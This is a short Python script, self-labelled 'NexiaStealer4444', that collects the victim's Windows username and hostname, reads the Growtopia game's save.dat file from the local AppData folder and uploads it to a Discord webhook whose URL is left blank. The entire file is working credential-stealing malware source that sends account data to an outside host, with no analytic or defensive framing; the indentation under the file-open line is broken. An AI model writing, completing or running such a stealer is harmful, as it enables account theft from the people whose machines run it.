import socket
from os import getenv
from discord_webhook import DiscordWebhook, DiscordEmbed

a="" # Webhook URL
b="New Account From: "+getenv("username")+" / "+socket.gethostname()
webhook = DiscordWebhook(url=a, username="NexiaStealer4444",content=b)

c=getenv("LOCALAPPDATA")+ "\\Growtopia\\save.dat"
with open(c, "rb") as f:
webhook.add_file(file=f.read(), filename='save.dat')
response = webhook.execute()